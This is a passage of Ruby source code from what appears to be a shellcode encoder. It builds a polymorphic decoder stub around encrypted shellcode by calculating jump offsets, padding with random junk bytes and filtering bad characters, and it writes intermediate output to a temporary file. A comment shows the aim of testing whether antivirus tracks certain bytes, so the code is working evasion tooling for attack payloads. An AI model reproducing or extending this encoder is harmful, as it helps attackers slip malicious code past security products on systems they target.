				loop_split = [loop_jmp + "eb05"].pack("H*")
			end
		end

		# end get the forward/backward splits <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<

		if $dgb == true and $nni == true
			# scrap_hex[decode_start..cmp]
			puts "loop_jmp_dis_int  = "+((scrappy.scrap_hex[7..11].join.length)/2).to_s # ARM (ARray Managment)
			puts "split back int    = "+(255-bk_split.unpack("H*").join.scan(/../).drop(1).join.to_i(16)).to_s
			puts "split forward int = "+fw_split.unpack("H*").join.scan(/../).drop(1).join.to_i(16).to_s+"\n\n"
		end
		## we append the jmps to after cmp
		scrappy.scrap_str[11] += loop_split # ARM
		scrappy.scrap_hex[11] += loop_split.unpack("H*").join("") # ARM

		decoder, decoder_size, first_seg, first_seg_size, second_seg, second_seg_size = get_seg(scrappy)

		# get the forward/backward splits <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<

		# get the forward/backward jmps >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>

=begin 
	order of operation                  order of calculation               
	--------------------------------------------------------------------------------------------------------
	jmp > to call_junk                  second - index(42s) - index(41s) + ret_jmp_junk 
	ret_dead_bytes                      first  - generate
	decoder + encrypted code            zero / done already
	call_junk                           first  - generate
	call > end of dead bytes            fw_jmp_dis  + call_junk
	shellcode

=end

		index_fd_jmp = decoder.index('414141414141414141414141') # FORWARD_JMP
		index_bk_jmp = decoder.index('424242424242424242424242') # BACKWARD_JMP

		#puts 'bk '+index_bk_jmp.to_s; puts 'fw '+index_fd_jmp.to_s


		fd_jmp_dis = ruby_check((lambda {((index_bk_jmp - index_fd_jmp - '414141414141414141414141'.length)/2)-1 + ret_jmp_junk_byte_count })).to_i

		if $dgb == true; puts 'first jmp dis int    = '+fd_jmp_dis.to_s; end
		fd_jmp = fd_jmp_dis.to_s(16)
		
		if fd_jmp.length%2 != 0; fd_jmp = '0'+fd_jmp; end

		fd_jmp = [fd_jmp].pack("H*").unpack("a*").join.scan(/./).reverse.join

		if $nni == true
			while fd_jmp.length != 4
				fd_jmp += ['00'].pack("H*")
			end
		end
		fd_jmp = fd_jmp.unpack("H*").join

		# \xff\xff\xff\xff - 5 - fd_jmp_dis + 1

		# junk garbage data was made earlier

		bk_jmp = ruby_check(lambda {([4294967291-(fd_jmp_dis - ret_jmp_junk_byte_count + call_junk_byte_count ) ]).pack("V*").unpack("H*").join})
		# sub ret_jmp_junk_byte_count: to get the values before modding ret_jmp_junk and call_junk


		if bk_jmp.length%2 != 0
			bk_jmp = '0'+bk_jmp
		end

		if $dgb == true
			puts "\nstraight forward jmp = " +fd_jmp
			puts "forward_int          = " +fd_jmp_dis.to_s
			puts "endian backwards jmp = " +bk_jmp+"\n\n"
		end

		scrappy.scrap_hex[scrappy.first_jmp] = (scrappy.scrap_hex[scrappy.first_jmp].gsub /414141414141414141414141/,(fd_jmp))+ret_jmp_junk
		

		scrappy.scrap_hex[12].gsub! /424242424242424242424242/,bk_jmp
		scrappy.scrap_hex[12] =  call_junk+scrappy.scrap_hex[12]

		# I removed these two items to identify if AV tracks them
		#scrappy.scrap_hex[scrappy.first_jmp] = ''
		#scrappy.scrap_hex[12] = ''

		decoder, decoder_size, first_seg, first_seg_size, second_seg, second_seg_size = get_seg(scrappy)

		# get the forward/backward jmps <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<

		# detach the offset from the front of $buf and attach to the end of the decoder
		prep = $buf.scan(/./)[0,prep.length].join
		$buf.gsub! /#{prep}/,''
		obf = scrappy.scrap_hex.join+prep
		
		# print out the shellcode (for if you are NOT using it in MSF)
		# puts '\x'+obf.scan(/../).join('\x')+'\x'+$buf.scan(/../).join('\x')
		

		## before and after the code, decoder reserved regs do not matter
		junkie.update_looper(99)
		junkie.update_key(99)
		junkie.update_code(99)

		if $ac != 'x64'; $reserved = [6];
		else; $reserved = []; end
		
		backward_junk = test_bad_bytes($r.rand((($sm*$foot)*$mult).to_i..($sm*$foot)),true)
		#$xor_badchars

		File.open('tmp',"a"){|f| f.write("\nbackward_junk ---------------------\n"+backward_junk.join(' ')+"\n")}
		
		@buffer +=  [backward_junk.join].pack("H*")
		decoder =  [obf].pack("H*")
		
		# To find decoder start, un-comment the lines below
		# mov ax, 0x4142 ; nine times
		# mov bx, 0x5555 ; one time
		#decoder = "\x66\xb8\x42\x41\x66\xb8\x42\x41\x66\xb8\x42\x41\x66\xb8\x42\x41\x66\xb8\x42\x41\x66\xb8\x42\x41\x66\xb8\x42\x41\x66\xb8\x42\x41\x66\xb8\x42\x41\x66\xb8\x42\x41\x66\xbb\x55\x55" + decoder

		total =  (decoder).unpack("H*").join.scan(/../).join(' ')
		File.open('tmp',"a"){|f| f.write("\ntotal ---------------------\n"+total+"\n")}

		return decoder, @buffer
		end
	end
end